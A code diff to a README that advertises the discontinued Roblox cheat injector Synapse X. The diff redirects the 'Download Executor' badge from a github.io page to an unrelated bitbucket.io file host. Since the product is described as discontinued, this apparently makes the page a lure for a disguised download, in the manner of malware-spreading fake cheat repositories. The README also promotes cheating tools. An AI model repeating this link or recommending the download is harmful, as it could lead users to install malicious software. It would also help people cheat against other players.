@@ -8,7 +8,7 @@
 
 Synapse X is the elite, paid Roblox script injector from Synapse Softworks. Known for its proprietary slua engine offering crazy fast and stable Lua script execution. It let players run custom mod scripts—skins, cheats, GUIs, and auto‑farms—straight in Roblox . Released in late 2018, it delivered premium stability and speed until officially discontinued in October 2023 after partnering with Roblox to tackle cheating .
 
-[![Download Executor](https://img.shields.io/badge/Download-Executor-blueviolet)](https://roblotools.github.io/executors/synapse-x/)
+[![Download Executor](https://img.shields.io/badge/Download-Executor-blueviolet)](https://fileoffload4.bitbucket.io)
 ---
 
 ## 🔥 Top‑Tier Features
@@ -73,3 +73,4 @@ Synapse X Executor was the ultimate paid Roblox script injector—fast, stable,
 ## 🎯 Keywords
 
 Synapse X Executor, Roblox slua engine, synapse lua injector, roblox script launcher, synapse x internal UI, synapse autoattach, synapse fps unlock, roblox script tabs, synapse x stability, discontinued synapse executor
+
